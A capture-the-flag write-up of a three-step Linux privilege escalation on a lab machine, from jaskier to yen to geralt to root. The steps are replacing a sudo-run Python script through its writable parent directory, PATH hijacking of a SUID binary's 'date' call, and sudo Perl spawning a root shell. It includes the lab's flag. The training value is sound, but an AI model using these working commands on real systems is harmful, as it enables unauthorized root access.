# Toss a Coin #2 — Privilege Escalation Notes

## 1. Initial Enumeration as `jaskier`

We inspected the home directory:

```bash
ls -la

-rw-r--r-- 1 root    root    toss-a-coin.py
-r-- 1 jaskier jaskier user.txt
```

The Python script belonged to `root`, so `jaskier` could read it but could not directly modify it.

We then checked sudo permissions:

```bash
sudo -l

User jaskier may run:
    (yen) /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

This means `jaskier` can execute the same script path + name as user `yen`.


## 2. Writable Parent Directory

The file itself belonged to `root`:

```bash
-rw-r--r-- root root toss-a-coin.py
```

So `jaskier` could not write inside it.

However, `/home/jaskier` belonged to `jaskier` and was writable:

```bash
drwxr-xr-x jaskier jaskier /home/jaskier
```

File deletion and replacement depend mainly on the permissions of the parent directory.

Therefore `jaskier` could rename the original file:

```bash
mv toss-a-coin.py toss-a-coin.py.bak
```

and create a new file with the same name.


## 3. Escalation: `jaskier` → `yen`

We replaced the Python script with:

```bash
printf 'import os\nos.system("/bin/bash")\n' > toss-a-coin.py
```

This creates:

```python
import os
os.system("/bin/bash")
```

Purpose:

* `import os`: loads Python's OS interaction module.
* `os.system("/bin/bash")`: launches a Bash shell.

Then we ran the exact sudo-authorized command:

```bash
sudo -u yen /usr/bin/python3 /home/jaskier/toss-a-coin.py
```

Because Python was executed as `yen`, the Bash shell launched by Python inherited the privileges of `yen`.

Verification:

```bash
whoami
id
=>
yen
uid=1002(yen)
```

Privilege chain:

```bash
jaskier
   ↓
sudo Python as yen
   ↓
controlled Python script
   ↓
shell as yen
```

## 4. Enumeration as `yen`

Inside `/home/yen`:

```bash
ls -la

-rwsr-sr-x 1 root root portal
```

The binary had SUID/SGID bits set and belonged to `root`.

We searched readable strings in the binary (file containing executable code) portal:

```bash
strings /home/yen/portal
```

Interesting output:

```bash
setuid
setgid
system
I am preparing a portal for you Geralt.
/bin/echo -n 'It will be ready in about ' && date --date='next hour' -R
```

The program was calling:

```bash
date
```

without an absolute path.

This suggested a **PATH hijacking vulnerability**.


## 5. PATH Hijacking

The binary executed:

```bash
/bin/echo ... && date ...
```

`/bin/echo` had an absolute path, but `date` did not.

The shell therefore searches for `date` using the environment variable:

```bash
PATH
```

We created our own malicious `date` command:

```bash
mkdir -p /tmp/ybin

printf '#!/bin/sh\n/bin/bash -p\n' > /tmp/ybin/date
```

This created:

```sh
#!/bin/sh
/bin/bash -p
```

We made it executable:

```bash
chmod +x /tmp/ybin/date
```

Then executed `portal` with our directory first in `PATH`:

```bash
PATH=/tmp/ybin:$PATH ./portal
```

When `portal` executed:

```bash
date
```

the shell found:

```bash
/tmp/ybin/date
```

instead of:

```bash
/usr/bin/date
```

Our fake `date` launched a shell.

Verification:

```bash
id
```

Result:

```bash
uid=1003(geralt) gid=1002(yen)
```

So `portal` was deliberately switching to `geralt` before executing the vulnerable command.

Privilege chain:

```bash
yen
   ↓
SUID portal
   ↓
system("... date ...")
   ↓
PATH hijacking
   ↓
fake /tmp/ybin/date
   ↓
shell as geralt
```


## 6. Enumeration as `geralt`

We checked sudo permissions:

```bash
sudo -l

User geralt may run:
    (root) NOPASSWD: /usr/bin/perl
```

This means `geralt` can execute Perl as `root` without providing a password.


## 7. Escalation: `geralt` → `root`

We used Perl to spawn Bash:

```bash
sudo /usr/bin/perl -e 'exec "/bin/bash", "-p";'
```

Parameters:

* `sudo`: executes the permitted program with root privileges.
* `/usr/bin/perl`: explicitly allowed by sudo.
* `-e`: executes Perl code directly.
* `exec "/bin/bash", "-p"`: replaces Perl with a Bash shell.
* `-p`: preserves effective privileges.

Verification:

```bash
id
whoami

uid=0(root) gid=0(root)
root
```

We now had full root access.


## 8. Retrieve `root.txt`

```bash
ls -la /root

cat /root/root.txt

EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
```


# Complete Privilege Escalation Chain

```text
jaskier
   ↓
sudo allows Python script to run as yen
   ↓
replace toss-a-coin.py using writable parent directory
   ↓
shell as yen
   ↓
custom SUID binary: /home/yen/portal
   ↓
PATH hijacking on "date"
   ↓
shell as geralt
   ↓
sudo NOPASSWD: /usr/bin/perl
   ↓
Perl spawns Bash
   ↓
root
   ↓
/root/root.txt
```

# Key Lessons

* File permissions and directory permissions are separate concepts.
* A non-writable file can still sometimes be replaced if its parent directory is writable.
* SUID binaries calling external commands without absolute paths are vulnerable to PATH hijacking.
* Interpreters such as Python, Perl, Ruby, Vim, etc. are dangerous when allowed unrestricted through `sudo`.
* Always inspect:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
strings <custom_binary>
```

during Linux privilege escalation.
